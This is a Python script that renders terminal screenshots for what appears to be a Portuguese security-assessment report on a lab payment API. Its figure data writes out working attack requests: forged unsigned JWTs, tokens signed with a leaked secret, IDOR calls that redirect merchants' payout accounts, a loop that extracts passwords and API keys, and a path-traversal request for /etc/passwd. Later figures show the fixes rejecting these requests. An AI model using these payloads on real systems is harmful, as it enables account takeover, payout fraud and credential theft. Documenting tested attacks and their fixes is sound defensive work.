# -*- coding: utf-8 -*-
# Gera PNGs de terminal cru (sem chrome) a partir da saida real ja capturada.
import html, subprocess, pathlib, os
from PIL import Image, ImageChops

BASE = pathlib.Path("/tmp/claude-0/-home-user-securityclaude/286a1aba-26e1-5ba7-85b9-680fb8f38bc1/scratchpad/pdf2")
SHOTS = BASE/"shots"; SHOTS.mkdir(exist_ok=True)
CHROME = "/opt/pw-browsers/chromium"
BG = (12,15,19)   # #0c0f13

def esc(s): return html.escape(s, quote=False)

# conteudo identico ao do relatorio (saida real da execucao unica)
FIGS = {
1:[
 "# token forjado: header {\"alg\":\"none\"}, payload {\"sub\":\"m_0093\"}, SEM assinatura",
 "enzo@kali:~/arara-lab$ FORGED='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJtXzAwOTMifQ.'",
 "enzo@kali:~/arara-lab$ curl -s -i localhost:3000/v1/merchants/m_0093 -H \"Authorization: Bearer $FORGED\"",
 "HTTP/1.1 200 OK",
 "{",
 '  "id": "m_0093", "nome": "Curso Viver de Renda LTDA",',
 '  "email": "financeiro@viverderenda.com",',
 '  "senha": "arara123", "api_key": "sk_live_m0093_8f2a1c",',
 '  "webhook_secret": "whsec_plataforma_unico",',
 '  "payout_banco": "237", "payout_agencia": "0001", "payout_conta": "12345-6",',
 '  "saldo_centavos": 4820000',
 "}",
],
2:[
 "# atacante NAO tem login. token forjado alg:none com sub arbitrario ('anon')",
 "enzo@kali:~/arara-lab$ FORGED_NONE='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbm9uIn0.'",
 "# [antes] conta de recebimento do m_4821:  341 / 2020 / 98765-4",
 "enzo@kali:~/arara-lab$ curl -s -i -X POST localhost:3000/v1/merchants/payout-account \\",
 "     -H \"Authorization: Bearer $FORGED_NONE\" \\",
 "     -d '{\"merchant_id\":\"m_4821\",\"banco\":\"001\",\"agencia\":\"0001\",\"conta\":\"13337-0\",\"cpf_cnpj\":\"00000000000000\",\"notify\":false}'",
 "HTTP/1.1 201 Created",
 "# [depois] conta de recebimento do m_4821, redirecionada sem nenhuma credencial:",
 "    banco=001  ag=0001  conta=13337-0",
],
3:[
 "# assinamos um HS256 valido usando o segredo lido direto de src/auth.ts",
 "enzo@kali:~/arara-lab$ SIGNED=$(jwt-sign --secret 'arara-2024' --sub m_5117)",
 "enzo@kali:~/arara-lab$ curl -s -i localhost:3000/v1/merchants/m_5117 -H \"Authorization: Bearer $SIGNED\"",
 "HTTP/1.1 200 OK",
 '{ "id": "m_5117", "nome": "Ebook Emagrecimento Real",',
 '  "api_key": "sk_live_m5117_c1d4f0", "senha": "mudar123", ... }',
 "# o servidor tratou como legitimo um token que NOS assinamos",
],
4:[
 "# atacante = m_4821 (token proprio).   alvo = m_0093 (saldo R$ 48.200,00)",
 "# [antes] conta de payout do m_0093:  237 / 0001 / 12345-6",
 "enzo@kali:~/arara-lab$ curl -s -i -X POST localhost:3000/v1/merchants/payout-account \\",
 "     -H \"Authorization: Bearer $TOKEN_m4821\" \\",
 "     -d '{\"merchant_id\":\"m_0093\",\"banco\":\"999\",\"agencia\":\"6666\",\"conta\":\"00000-0\",\"cpf_cnpj\":\"00000000000000\",\"notify\":false}'",
 "HTTP/1.1 201 Created",
 "# [depois] conta de payout do m_0093, trocada e persistida:",
 "    banco=999  ag=6666  conta=00000-0  cnpj=00000000000000",
],
5:[
 "# token LEGITIMO do m_4821 lendo o cadastro do m_5117 (outro dono)",
 "enzo@kali:~/arara-lab$ curl -s -i localhost:3000/v1/merchants/m_5117 -H \"Authorization: Bearer $TOKEN_m4821\"",
 "HTTP/1.1 200 OK",
 "{",
 '  "id": "m_5117", "nome": "Ebook Emagrecimento Real",',
 '  "email": "adm@emagrecimentoreal.com",',
 '  "senha": "mudar123", "api_key": "sk_live_m5117_c1d4f0",',
 '  "webhook_secret": "whsec_plataforma_unico",',
 '  "payout_banco": "260", "payout_agencia": "0001", "payout_conta": "55555-5",',
 '  "saldo_centavos": 1870000',
 "}",
],
6:[
 "# loop forjando alg:none para cada id e extraindo os segredos",
 "enzo@kali:~/arara-lab$ for id in m_0093 m_4821 m_5117; do \\",
 "     curl -s $B/v1/merchants/$id -H \"Authorization: Bearer $(forge_none $id)\"; \\",
 "  done | jq -r '[.id,.senha,.api_key,.webhook_secret] | @tsv'",
 "m_0093   arara123    sk_live_m0093_8f2a1c   whsec_plataforma_unico",
 "m_4821   senha2024   sk_live_m4821_3b9e7d   whsec_plataforma_unico",
 "m_5117   mudar123    sk_live_m5117_c1d4f0   whsec_plataforma_unico",
],
7:[
 "# login legitimo do lojista m_4821",
 "enzo@kali:~/arara-lab$ TOKEN=$(curl -s -X POST localhost:3000/v1/auth/login \\",
 "     -d '{\"email\":\"contato@alphatrader.com\",\"senha\":\"senha2024\"}' | jq -r .token)",
 "# decodificando o payload (base64). repare: NAO ha campo exp",
 "enzo@kali:~/arara-lab$ echo $TOKEN | cut -d. -f2 | base64 -d",
 '{"sub":"m_4821","iat":1791405186}',
],
8:[
 "# token com exp em novembro de 2023, anos no passado",
 "enzo@kali:~/arara-lab$ echo $EXPIRADO | cut -d. -f2 | base64 -d",
 '{"sub":"m_5117","iat":1700000000,"exp":1700003600}',
 "enzo@kali:~/arara-lab$ curl -s -i localhost:3000/v1/merchants/m_5117 -H \"Authorization: Bearer $EXPIRADO\"",
 "HTTP/1.1 200 OK",
 "# aceito normalmente: a verificacao passa ignoreExpiration:true",
],
9:[
 "# linha gerada pelo endpoint de relatorio: Bearer inteiro em texto",
 "enzo@kali:~/arara-lab$ grep 'conciliacao auth=' server.log | tail -1",
 "[Nest] 947  - 10/07/2026, 8:33:06 PM   DEBUG [reports] conciliacao auth=Bearer",
 "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJtXzQ4MjEiLCJpYXQiOjE3OTE0MDUxODZ9.cvJbfjbHQjt0YC2oqC-mz1dkx4T_tABy7UqMlzBPhvY params={\"arquivo\":\"out.csv\"}",
],
10:[
 "enzo@kali:~/arara-lab$ curl -s -i -G localhost:3000/v1/reports/conciliacao \\",
 "     -H \"Authorization: Bearer $TOKEN_m4821\" \\",
 "     --data-urlencode 'arquivo=../../../../etc/passwd'",
 "HTTP/1.1 200 OK",
 "{",
 '  "merchant": "m_4821",',
 '  "download_url": "https://arara-conciliacao.s3.amazonaws.com/relatorios/../../../../etc/passwd",',
 '  "arquivo": "relatorios/../../../../etc/passwd"',
 "}",
],
11:[
 "# m_4821 (token legitimo) tentando trocar a conta do m_0093",
 "enzo@kali:~/arara-lab$ curl -s -i -X POST localhost:3001/v1/merchants/payout-account \\",
 "     -H \"Authorization: Bearer $TOKEN_m4821\" -d '{\"merchant_id\":\"m_0093\", ...}'",
 "HTTP/1.1 403 Forbidden",
 '{"message":"nao autorizado a alterar outro lojista","error":"Forbidden","statusCode":403}',
 "# sub do token != merchant_id do corpo -> recusado",
],
12:[
 "# mesmo token forjado alg:none do ataque original",
 "enzo@kali:~/arara-lab$ curl -s -i localhost:3001/v1/merchants/m_0093 -H \"Authorization: Bearer $FORGED_NONE\"",
 "HTTP/1.1 401 Unauthorized",
 '{"message":"token invalido","error":"Unauthorized","statusCode":401}',
 "# jwt.verify com algorithms:['HS256'] rejeita o 'none' (a excecao vira 401, nao 500)",
],
13:[
 "# m_4821 tentando ler o cadastro do m_5117 (outro dono)",
 "enzo@kali:~/arara-lab$ curl -s -i localhost:3001/v1/merchants/m_5117 -H \"Authorization: Bearer $TOKEN_m4821\"",
 "HTTP/1.1 403 Forbidden",
 "# lendo o PROPRIO cadastro: DTO mascarado, sem senha/api_key/webhook_secret",
 "enzo@kali:~/arara-lab$ curl -s localhost:3001/v1/merchants/m_4821 -H \"Authorization: Bearer $TOKEN_m4821\"",
 '{"id":"m_4821","nome":"Mentoria Alpha Trader","email":"contato@alphatrader.com",',
 ' "payout_banco":"341","payout_agencia":"2020","payout_conta":"****-4","saldo_centavos":9610000}',
],
14:[
 "# mesma tentativa de ../ no parametro",
 "enzo@kali:~/arara-lab$ curl -s -i -G localhost:3001/v1/reports/conciliacao \\",
 "     -H \"Authorization: Bearer $TOKEN_m4821\" --data-urlencode 'arquivo=../../../etc/passwd'",
 "HTTP/1.1 400 Bad Request",
 '{"message":"referencia de relatorio invalida","error":"Bad Request","statusCode":400}',
 "# fora do formato [A-Za-z0-9_-] -> 400",
],
15:[
 "# m_4821 trocando a PROPRIA conta (merchant_id == sub) com segundo fator",
 "enzo@kali:~/arara-lab$ curl -s -i -X POST localhost:3001/v1/merchants/payout-account \\",
 "     -H \"Authorization: Bearer $TOKEN_m4821\" \\",
 "     -d '{\"merchant_id\":\"m_4821\",\"banco\":\"341\",\"agencia\":\"2020\",\"conta\":\"98765-4\",\"cpf_cnpj\":\"44555666000199\",\"step_up_ok\":true}'",
 "HTTP/1.1 201 Created",
 '{"ok":true,"merchant":{"id":"m_4821","nome":"Mentoria Alpha Trader","payout_conta":"****-4","saldo_centavos":9610000}}',
 "# quem integra de boa nao quebra: so muda a propria conta",
],
}

PROMPT = "enzo@kali:~/arara-lab$"
def render_line(ln):
    if ln.lstrip().startswith("#"):
        return f'<span class="cm">{esc(ln)}</span>'
    if ln.startswith(PROMPT):
        rest = ln[len(PROMPT):]
        return (f'<span class="u">enzo@kali</span><span class="x">:</span>'
                f'<span class="p">~/arara-lab</span><span class="x">$</span>{esc(rest)}')
    return esc(ln)

HTML = """<!doctype html><meta charset="utf-8"><style>
 html,body{{margin:0;background:#0c0f13}}
 .wrap{{box-sizing:border-box;width:900px;padding:20px 22px}}
 pre{{margin:0;font-family:'DejaVu Sans Mono',monospace;font-size:14.5px;line-height:1.55;
      color:#d6d6d6;white-space:pre-wrap;overflow-wrap:anywhere}}
 .u{{color:#5fd75f;font-weight:bold}} .p{{color:#6ea8fe;font-weight:bold}} .x{{color:#d6d6d6}}
 .cm{{color:#7e8793}}
</style><div class="wrap"><pre>{body}</pre></div>"""

FIXED_W = 900  # css px da .wrap

def shoot(n, lines):
    body = "\n".join(render_line(l) for l in lines)
    page = BASE/f"_pg{n}.html"
    page.write_text(HTML.format(body=body), encoding="utf-8")
    raw = SHOTS/f"_raw{n}.png"
    subprocess.run([CHROME,"--headless","--no-sandbox","--disable-gpu","--hide-scrollbars",
        f"--force-device-scale-factor=2","--window-size=980,2400",
        f"--screenshot={raw}", f"file://{page}"], capture_output=True)
    im = Image.open(raw).convert("RGB")
    bg = Image.new("RGB", im.size, BG)
    bbox = ImageChops.difference(im, bg).getbbox()
    if bbox:
        l,t,r,b = bbox
        m = 36  # ~18px @2x
        t = max(0, t-m); b = min(im.height, b+m)
        # largura fixa (0 .. FIXED_W*2) para todas as figuras ficarem iguais
        right = min(im.width, FIXED_W*2 + 1)
        im = im.crop((0, t, right, b))
    out = SHOTS/f"fig{n}.png"
    im.save(out)
    return out, im.size

for n, lines in FIGS.items():
    o, sz = shoot(n, lines)
    print(f"fig{n}: {sz[0]}x{sz[1]}")
print("OK shots em", SHOTS)
